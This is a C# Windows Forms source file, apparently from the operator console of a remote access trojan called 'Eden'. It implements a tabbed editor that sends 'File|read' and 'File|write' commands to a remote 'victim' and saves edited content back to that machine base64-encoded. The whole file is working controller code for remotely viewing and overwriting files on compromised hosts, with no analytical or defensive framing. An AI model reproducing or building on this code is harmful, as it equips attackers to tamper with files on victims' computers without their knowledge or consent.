using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Formats.Tar;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

using ICSharpCode.TextEditor;
using ICSharpCode.TextEditorEx;

namespace Eden
{
    public partial class frmFileEditor : Form
    {
        public clsClient m_clnt { get { return m_victim.m_clnt; } }
        public string m_szVictimID { get { return m_victim.m_szID; } }
        public clsVictim m_victim { get; init; }

        private string m_InitDir { get; set; }

        private struct stTabInfoTag
        {
            public string szFilename;
        }

        public frmFileEditor(clsVictim victim)
        {
            InitializeComponent();

            m_victim = victim;
        }

        void fnRecv(clsClient clnt, string szVictimID, List<string> lsMsg)
        {
            if (!string.Equals(m_szVictimID, szVictimID))
                return;

            if (lsMsg[0] == "file")
            {
                if (lsMsg[1] == "write")
                {
                    int code = int.Parse(lsMsg[2]);
                    if (code == 0)
                    {
                        MessageBox.Show(lsMsg[3], "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    }
                    else
                    {
                        Invoke(() =>
                        {
                            foreach (TabPage page in tabControl1.TabPages)
                            {
                                var control = GetTabPageControls(page);
                                if (string.Equals(control.tbFileName.Text, lsMsg[3]))
                                    page.Text = page.Text.Replace("*", string.Empty);
                            }
                        });
                    }
                }
            }
        }

        #region Function

        private void SendReadFile(string szFilename)
        {
            //m_clnt.SendVictim(szVictimID, $"File|read|{szFilename}");
            m_victim.fnSendCommand($"File|read|{szFilename}");
        }

        private bool FileNotSave()
        {
            return tabControl1.SelectedTab.Text.Contains("*");
        }

        private (TextBox tbFileName, TextEditorControlEx editorEx, TextBox tbFindPattern) GetTabPageControls(TabPage page = null)
        {
            page = page ?? tabControl1.SelectedTab;
            if (page == null)
                return (null, null, null);

            TextEditorControlEx editorEx = (TextEditorControlEx)page.Controls[0];
            TextBox tbFileName = (TextBox)page.Controls[1];
            TextBox tbFindPattern = (TextBox)page.Controls[2];

            return (tbFileName, editorEx, tbFindPattern);
        }

        public void ShowFileContent(string szFilename, string szContent)
        {
            if (FindPage(szFilename) is TabPage t)
            {
                tabControl1.SelectedTab = t;
                var x = GetTabPageControls(t);
                x.editorEx.Text = szContent;

                t.Text = t.Text.Replace("*", string.Empty);

                return;
            }

            if (string.IsNullOrEmpty(m_InitDir))
                m_InitDir = Path.GetDirectoryName(szFilename);

            TextBox tbFilename = new TextBox();
            TextEditorControlEx editorControl = new TextEditorControlEx();
            TextBox tbFind = new TextBox();

            TabPage page = new TabPage();
            page.Text = Path.GetFileName(szFilename);
            page.Controls.Add(tbFilename);
            page.Controls.Add(editorControl);
            page.Controls.Add(tbFind);

            tbFilename.Dock = DockStyle.Top;
            editorControl.Dock = DockStyle.Fill;
            tbFind.Dock = DockStyle.Bottom;

            tbFilename.SendToBack();
            tbFind.SendToBack();

            stTabInfoTag st = new stTabInfoTag()
            {
                szFilename = szFilename,
            };

            page.Tag = st;

            tabControl1.TabPages.Add(page);
            tabControl1.SelectedTab = page;

            tbFilename.Text = szFilename;
            editorControl.Text = szContent;

            #region Set Event

            editorControl.TextChanged += TextEditor_TextChanged;

            #endregion
        }

        private TabPage FindPage(string szFilename)
        {
            foreach (TabPage page in tabControl1.TabPages)
            {
                stTabInfoTag st = (stTabInfoTag)page.Tag;
                if (st.szFilename == szFilename)
                    return page;
            }

            return null;
        }

        private void SaveFile(TabPage page = null)
        {
            Invoke(new Action(() =>
            {
                if (page == null)
                    page = tabControl1.SelectedTab;

                var x = GetTabPageControls(page);
                m_clnt.SendVictim(m_szVictimID, $"File|write|{x.tbFileName.Text}|{EZCrypto.Encoder.stre2b64(x.editorEx.Text)}");
            }));
        }
        private void SaveAllFiles()
        {
            foreach (TabPage page in tabControl1.TabPages)
                SaveFile(page);
        }

        #endregion

        #region Event Handler

        private void TextEditor_TextChanged(object sender, EventArgs e)
        {
            TabPage page = tabControl1.SelectedTab;
            if (page == null)
                return;

            if (!page.Text.Contains("*"))
                page.Text += "*";
        }

        #endregion

        void setup()
        {
            m_clnt.ServerMessageReceived += fnRecv;

            foreach (TabPage page in tabControl1.TabPages)
                tabControl1.TabPages.Remove(page);

            tabControl1.DrawMode = TabDrawMode.OwnerDrawFixed;
            tabControl1.Padding = new Point(18, 4);
            tabControl1.ItemSize = new Size(0, 24);
            tabControl1.DrawItem += (s, e) =>
            {
                TabPage tab = tabControl1.TabPages[e.Index];
                Rectangle rect = tabControl1.GetTabRect(e.Index);

                TextRenderer.DrawText(
                    e.Graphics,
                    tab.Text,
                    tab.Font,
                    rect,
                    tab.ForeColor,
                    TextFormatFlags.Left | TextFormatFlags.VerticalCenter
                );

                Rectangle closeRect = new Rectangle(
                    rect.Right - 15,
                    rect.Top + 2,
                    12,
                    15
                );

                e.Graphics.DrawString("x", Font, Brushes.Black, closeRect);
            };
            tabControl1.MouseDown += (s, e) =>
            {
                for (int i = 0; i < tabControl1.TabPages.Count; i++)
                {
                    Rectangle tabRect = tabControl1.GetTabRect(i);
                    Rectangle closeRect = new Rectangle(
                        tabRect.Right - 15,
                        tabRect.Top + 4,
                        12,
                        12
                    );

                    if (closeRect.Contains(e.Location))
                    {
                        tabControl1.TabPages.RemoveAt(i);
                        break;
                    }
                }
            };
        }

        private void frmFileEditor_Load(object sender, EventArgs e)
        {
            setup();
        }

        private void frmFileEditor_FormClosed(object sender, FormClosedEventArgs e)
        {
            m_clnt.ServerMessageReceived -= fnRecv;
        }

        private void tabControl1_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.Modifiers == Keys.Control)
            {
                if (e.KeyCode == Keys.S)
                {
                    TabPage page = tabControl1.SelectedTab;

                    if (page == null)
                        return;

                    if (page.Text.Contains("*"))
                    {
                        SaveFile();
                    }
                }
                else if (e.KeyCode == Keys.W)
                {
                    TabPage? page = tabControl1.SelectedTab;

                    if (page == null)
                        return;

                    if (FileNotSave())
                    {
                        DialogResult dr = MessageBox.Show("Do you want to save this file ?", "Wait", MessageBoxButtons.YesNo, MessageBoxIcon.Question);
                        if (dr == DialogResult.Yes)
                        {
                            SaveFile();
                        }
                    }

                    tabControl1.TabPages.Remove(page);
                }
            }
            else
            {
                if (e.KeyCode == Keys.F5)
                {

                }
            }
        }

        //New TextFile
        private void toolStripMenuItem1_Click(object sender, EventArgs e)
        {
            string szFileName = clsTools.GetFileNameFromDatetime("txt");
            string szFilePath = string.IsNullOrEmpty(m_InitDir) ? szFileName : Path.Combine(m_InitDir, szFileName).Replace("\\", "/");

            ShowFileContent(szFilePath, string.Empty);
        }

        //Save Remote
        private void toolStripMenuItem4_Click(object sender, EventArgs e)
        {
            if (tabControl1.TabPages.Count == 0)
                return;

            TabPage? page = tabControl1.SelectedTab;
            if (page == null)
                return;

            SaveFile(page);
        }

        //Save Local
        private void toolStripMenuItem5_Click(object sender, EventArgs e)
        {
            if (tabControl1.TabPages.Count == 0)
                return;

            TabPage? page = tabControl1.SelectedTab;
            if (page == null)
                return;

            var control = GetTabPageControls(page);
            string szFilePath = control.tbFileName.Text;

            SaveFileDialog sfd = new SaveFileDialog();
            sfd.FileName = Path.GetFileName(szFilePath);
            sfd.InitialDirectory = Directory.Exists(m_victim.m_szDirectory) ? m_victim.m_szDirectory : Application.StartupPath;
            if (sfd.ShowDialog() == DialogResult.OK)
            {
                string szContent = control.editorEx.Text;
                File.WriteAllText(sfd.FileName, szContent);
            }
        }

        //Refresh
        private void toolStripMenuItem3_Click(object sender, EventArgs e)
        {
            if (tabControl1.TabPages.Count == 0)
                return;

            TabPage? page = tabControl1.SelectedTab;
            if (page == null)
                return;

            var control = GetTabPageControls(page);
            string szFilePath = control.tbFileName.Text;
            control.editorEx.Text = string.Empty;
            page.Text = page.Text.Replace("*", string.Empty);

            SendReadFile(szFilePath);
        }
    }
}
